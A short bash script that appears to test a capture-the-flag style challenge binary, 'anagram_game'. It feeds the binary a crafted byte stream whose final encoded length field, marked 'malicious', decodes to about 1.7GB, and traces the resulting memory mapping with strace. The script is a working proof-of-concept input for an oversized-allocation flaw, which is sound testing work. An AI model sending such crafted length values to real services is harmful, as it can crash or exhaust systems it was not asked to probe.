#!/bin/bash
# Direct test of anagram_game with the malicious input

# Create test input: proper initialization + malicious string length
{
    # Send initial word count (0x84 = 132 words for initialization)
    echo -ne '\x84\x58'

    # Send 132 words (simplified - just send enough to initialize)
    for i in {1..132}; do
        echo -ne '\x04test'
    done

    # Start game command (CMD_PLAY_GAME = 5)
    echo -ne '\x05'

    # The program will send game prompts, we'll send the malicious size
    sleep 1

    # Send the malicious string length that decodes to 1.7GB
    echo -ne '\x86\xd2\xaf\xb1\x5b'

    sleep 5
} | strace -e trace=mmap,munmap,exit,exit_group -f build64/challenges/anagram_game/anagram_game 2>&1 | grep -E "mmap.*17833|exit"
